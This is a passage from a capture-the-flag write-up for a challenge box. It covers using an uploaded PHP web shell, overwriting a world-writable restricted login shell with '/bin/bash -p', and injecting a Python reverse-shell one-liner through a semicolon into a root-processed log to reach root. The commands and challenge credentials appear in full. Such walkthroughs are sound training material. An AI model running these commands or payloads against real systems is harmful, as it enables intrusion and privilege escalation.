+302    20B   http://178.62.44.186:80/site.php    -&gt; REDIRECTS TO: index.php</code></pre><p id="fb1c72f4-e16e-4685-9f15-cc630dd2f2c5" class=""><mark class="highlight-yellow">step 5: search for the shell</mark></p><p id="fdf89751-233d-4749-81e8-4575ffc72783" class="">Get shell after execute the following</p><pre id="e1c7e46e-28fa-4dfd-8781-bd662580269b" class="code"><code>kali@kali:~$ curl  -ki -X GET http://178.62.44.186/images/assassin.png.php/ -vv</code></pre><figure id="bc29580c-2bae-46c1-9626-34862c13f427" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2010.png"><img style="width:1920px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2010.png"/></a></figure><p id="b41888e8-5086-48c4-a024-6c681942d990" class=""><mark class="highlight-yellow">step 6: get flag</mark></p><pre id="61552746-21b6-4d93-adb7-8ef7400eb842" class="code"><code>find / -type f -name flag
+/var/www/flag</code></pre><figure id="2bb41a52-dcf1-44f7-8b66-2e21795500c0" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2011.png"><img style="width:1920px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2011.png"/></a></figure><pre id="1afd3c9e-6445-4740-93f7-ceddaa9f6300" class="code"><code>www-data@Big-challange:/$ cat /var/www/flag
+cat /var/www/flag
+CC{W0w_th1s_1$_an_aws0me_she11}
+user:hanaka
+password:wewatchinsuperman
+www-data@Big-challange:/$</code></pre><blockquote id="4e3e8359-3caf-4080-b873-8ac08e2937f8" class="">we get a user hanaka and password wewatchinsuperman</blockquote><h1 id="d2ab218c-ef4e-4686-895e-c4d2ee802d03" class=""><mark class="highlight-teal">Linux:</mark></h1><h2 id="d9fb9fc4-7c5b-4365-92b3-aa339ef4ca58" class=""><mark class="highlight-red">Graphity Bypass:</mark></h2><h3 id="b917e1d9-ec42-4d1a-ad1f-2c7f2bda24bc" class=""><mark class="highlight-yellow">Try to get shell as hanaka:</mark></h3><ul id="e8125bea-d6f5-403b-a61e-ffbbc5a877f7" class="block-color-blue bulleted-list"><li>user: hanaka</li></ul><ul id="a5f1b1de-6222-4206-8f51-239b7492f2fe" class="block-color-blue bulleted-list"><li>password: wewatchinsuperman</li></ul><p id="31bf9274-5f79-4ca5-a38b-03c87a312feb" class="">After trying su hanaka i get this back</p><figure id="8cfea469-f744-4833-9074-9a3a9c0d785f" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2012.png"><img style="width:1908px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2012.png"/></a><figcaption>LOL 🙂</figcaption></figure><p id="7bc6737c-4c0f-4f55-895f-12f97838cb12" class="">Okay after tying to SSH with this credential i get this back</p><figure id="e7444d0b-f099-4a6a-931a-0eaa2cee1f9d" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2013.png"><img style="width:1920px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2013.png"/></a></figure><pre id="7bb00ff1-e648-46b4-a3df-b6206a531abb" class="code"><code>$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
+hanaka:x:1000:1000::/home/hanaka:/usr/bin/showtext</code></pre><p id="84575b5d-89c7-460e-890c-5e4f48612d59" class="">User hanaka have /usr/bin/showtext as shell 🙂 this is the Graphity to bypass</p><pre id="985edad4-f1ed-4715-a408-2eb111fddae4" class="code"><code>www-data@Big-challange:/$ ls -lh /usr/bin/showtext
+ls -lh /usr/bin/showtext
+-rwxrwxrwx 1 hanaka hanaka 52 Apr  3 00:52 /usr/bin/showtext
+www-data@Big-challange:/$ cat /usr/bin/showtext
+cat /usr/bin/showtext
+#!/bin/sh
+export TERM=linux
+more ~/text.txt
+exit 0
+
+www-data@Big-challange:/$</code></pre><pre id="46829f0f-b000-4ef1-985d-e1f2ae03acf5" class="code"><code>#!/bin/sh
+export TERM=linux
+more ~/text.txt
+exit 0</code></pre><pre id="327b4334-523f-426a-9c8a-3532e0cf3fbd" class="code"><code># This can be solved using GTFObin to escape the more restricted command
+# but there is an issue with the challange, a misconfiguration of the showtext permission
+# which make the file world writable</code></pre><pre id="ae35dedf-ee29-4d82-b2ed-e07ce982774c" class="code"><code>#!/bin/bash
+/bin/bash -p</code></pre><pre id="2051571e-fb47-4568-8473-8b93ebadded8" class="code"><code>echo &quot;#!/bin/bash&quot; &gt; /usr/bin/showtext
+echo &quot;/bin/bash -p&quot; &gt;&gt; /usr/bin/showtext</code></pre><pre id="7c8f16e8-c521-4167-9e5a-4e70b56afa11" class="code"><code># In the machine box
+www-data@Big-challange:/$ nc -lvp 1234 &gt; /usr/bin/showtext
+# In my Kali Linux machine
+kali@kali:~$ vim fromMe
+#!/bin/bash
+
+/bin/bash -p
+kali@kali:~$ nc 178.62.44.186 1234 &lt; fromMe
+
+# In the machine box
+www-data@Big-challange:/$ su hanaka
+password: wewatchinsuperman
+hanaka@Big-challange:/$
+</code></pre><figure id="adb8cb11-d9ba-49f0-980b-b3377464129c" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2014.png"><img style="width:748px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2014.png"/></a></figure><figure id="1f51c06e-1238-4be5-819b-7e89fdea1eca" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2015.png"><img style="width:1918px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2015.png"/></a></figure><p id="0a4390d1-c478-4a22-9544-ada65011b007" class=""><mark class="highlight-yellow">Get the flag:</mark></p><figure id="a21e5353-b327-4d82-a8d9-5ab7a0003a0e" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2016.png"><img style="width:1904px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2016.png"/></a></figure><p id="e5a1252d-ba39-4e2f-839c-e276402abcea" class="">
+</p><pre id="df4d5e2a-9f93-4fe5-bda5-5651a8771d2c" class="code"><code>hanaka@Big-challange:~$ ls
+ls
+Demo  flag  text.txt
+hanaka@Big-challange:~$ cat flag
+cat flag
+CC{bypassing_restricted_shell}
+hanaka@Big-challange:~$</code></pre><h2 id="d663eb0d-3101-4ac7-84f9-5130846ad66f" class=""><mark class="highlight-red">Privilege escalation:</mark></h2><p id="725c1491-39df-4f3a-b3ee-4050bd14140d" class="">🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂🙂</p><pre id="0ce9ca18-f110-45cc-b4a8-f9cbfc1d4b61" class="code"><code>wtf me ;python3 -c &#x27;import pty;import socket,os;s=socket.socket(socket.AF_INET,
+socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,1234));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre><pre id="5771e2d9-369a-4c9a-80d6-124ecab0c2a9" class="code"><code># from my kali machine
+kali@kali:~$ vim fromMe2
+
+wtf me ;python3 -c &#x27;import pty;import socket,os;s=socket.socket(socket.AF_INET,
+socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,1234));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#x27;
+
+kali@kali:~$ nc 178.62.44.186 1234 &lt; fromMe2</code></pre><pre id="c146c9fd-63a9-4a88-89a6-4970a2df0f51" class="code"><code># from the challange machine
+nc -lvp 1234 &gt; hackers
+ </code></pre><pre id="ccf9d436-4d6d-4c3a-ba4c-d1bd3c8b069c" class="code"><code>hanaka@Big-challange:~/Demo/logs$ nc -lvp 1234 &gt; hackers
+nc -lvp 1234 &gt; hackers
+Listening on 0.0.0.0 1234
+Connection received on 94.187.0.226 2178
+hanaka@Big-challange:~/Demo/logs$ cat hackers
+cat hackers
+wtf me ;python3 -c &#x27;import pty;import socket,os;s=socket.socket(socket.AF_INET,
+socket.SOCK_STREAM);s.connect((&quot;0.0.0.0&quot;,1234));
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#x27;
+hanaka@Big-challange:~/Demo/logs$ nc -lvp 1234
+nc -lvp 1234
+Listening on 0.0.0.0 1234
+Connection received on localhost 57658
+root@Big-challange:/home/hanaka/Demo# whoami
+whoami
+whoami
+root
+root@Big-challange:/home/hanaka/Demo# ls
+ls
+ls
+executeCommand.sh  logs  recon
+root@Big-challange:/home/hanaka/Demo# cd 
+cd 
+cd 
+root@Big-challange:~# ls
+ls
+ls
+flag.txt  snap
+root@Big-challange:~# cat flag.txt
+cat flag.txt
+cat flag.txt
+CC{Thank_Y0u_Ha$$an}
+root@Big-challange:~#</code></pre><p id="0202e495-6704-4a60-93f0-024d93584dc8" class="">
+</p><figure id="484ced4a-bb76-4639-bb8d-0b947bb7fff2" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2017.png"><img style="width:1912px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2017.png"/></a></figure><h1 id="4cc430ba-6c1a-44f0-a4db-3be15feeae2a" class=""><mark class="highlight-teal">Thanks:</mark></h1><figure id="2e8c5b2b-54ef-4aa3-9937-bf9e7a680ce9" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2018.png"><img style="width:1915px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2018.png"/></a></figure><h1 id="590816cd-b6ea-4e34-90be-e7669d45b213" class=""><mark class="highlight-teal">Challenges:</mark></h1><figure id="25c1ec8e-4d0c-4aab-b33b-e9957fc29394" class="image"><a href="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2019.png"><img style="width:1896px" src="Big%20Challenge%20from%20Cyber%20Community%200390aaf47ffc4faeb5e0114438bafedb/Untitled%2019.png"/></a></figure><p id="4825a968-bc8f-439c-8604-8a53c675d99c" class="">
+</p></div></article></body></html>
